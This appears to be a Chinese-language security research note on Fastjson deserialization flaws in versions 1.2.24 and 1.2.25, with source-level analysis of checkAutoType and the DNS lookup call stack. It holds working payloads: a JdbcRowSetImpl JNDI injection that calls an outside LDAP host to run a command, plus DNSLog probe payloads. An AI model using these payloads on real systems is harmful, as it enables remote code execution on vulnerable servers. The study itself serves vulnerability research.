前置基础
---

相关漏洞
---

### <= v1.2.24

pom.xml

```xml
<!-- https://mvnrepository.com/artifact/com.alibaba/fastjson -->
<dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.24</version>
</dependency>
```



PayloadRunner.java

```java
public class PayloadRunner {
    public static void main(String[] args) {
        String payload_v1_2_24 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://10.10.10.1:1389/Basic/Command/calc\",\"autoCommit\":true}";
        JSON.parseObject(payload_v1_2_24);
    }
}
```



*payloads* can be *generated* from within the `JNDIExploit.v1.2 `

- https://github.com/feihong-cs/

![image](https://user-images.githubusercontent.com/55024146/163208057-e33cde47-01a6-4f8a-b2d5-260dc523dbd9.png)


### v1.2.25

pom.xml

```xml
<!-- https://mvnrepository.com/artifact/com.alibaba/fastjson -->
<dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.25</version>
</dependency>
```



```java
String payload_v1_2_24 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://10.10.10.1:1389/Basic/Command/calc\",\"autoCommit\":true}";
```



**弹计算器-失败**


![image](https://user-images.githubusercontent.com/55024146/163208138-e5c67f9b-7669-4102-9b8d-195c35ccbe51.png)

原因

- 默认关闭了autotype支持，并且加入了checkAutotype

![image](https://user-images.githubusercontent.com/55024146/163208367-c0e3820b-aaf9-48b7-813e-5bfc1ee6d3c0.png)

新增黑名单

![image](https://user-images.githubusercontent.com/55024146/163208421-b1bccff5-0939-4636-8e46-31013f7ab122.png)


**DNSLog-成功**


```java
String payload_dnslog = "{\"@type\":\"java.net.Inet4Address\",\"val\":\"t6dwta.dnslog.cn\"}";
```

- 为什么会成功？

  - 这或许可以回答为什么很多渗透测试项目中遇到fastjson并成功dns回显，但是却利用失败的部分情况
    - autotype = false

- 如何利用dns精确检测呢?

  - ```java
    [{"@type":"java.net.CookiePolicy"},{"@type":"java.net.Inet4Address","val":"ydk3cz.dnslog.cn"}]
    ```

    因为目标环境没开启 autotype -> 前面部分会报错 -> 后面部分不会被执行 -> 失败

  - ```java
    # 开启AutoTypeSupport
    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
    ```

    此时已开启 autotype -> dnslog成功回显

![image](https://user-images.githubusercontent.com/55024146/163208304-18244148-c2f5-4064-9830-0e9649d307d1.png)


> 分析 `为什么没有开启autotype，仍然可以进行dns解析？`


跟踪到 `com.alibaba.fastjson.parser.ParserConfig#checkAutoType`时，有这样一段代码
```java
try {
    return InetAddress.getByName(strVal);
} catch (UnknownHostException var10) {
    throw new JSONException("deserialize inet adress error", var10);
}
```

![image](https://user-images.githubusercontent.com/55024146/163209617-febfa0d4-fd10-4f9d-8bbd-984a204a7117.png)

- 取到了 java.net.Inet4Address

而在跟进到 `com.alibaba.fastjson.serializer.MiscCodec#deserialze`，经过一些判断后，调用了 `InetAddress.getByName()` 进行DNS解析。

![image](https://user-images.githubusercontent.com/55024146/163210134-09eccf77-8f35-464a-a1a9-99473a1338e8.png)


调用栈
```
getByName:1076, InetAddress (java.net)
deserialze:301, MiscCodec (com.alibaba.fastjson.serializer)
parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:137, JSON (com.alibaba.fastjson)
parse:128, JSON (com.alibaba.fastjson)
parseObject:201, JSON (com.alibaba.fastjson)
main:26, PayloadRunner (Deserialization.Fastjson)
```



利用研究
---

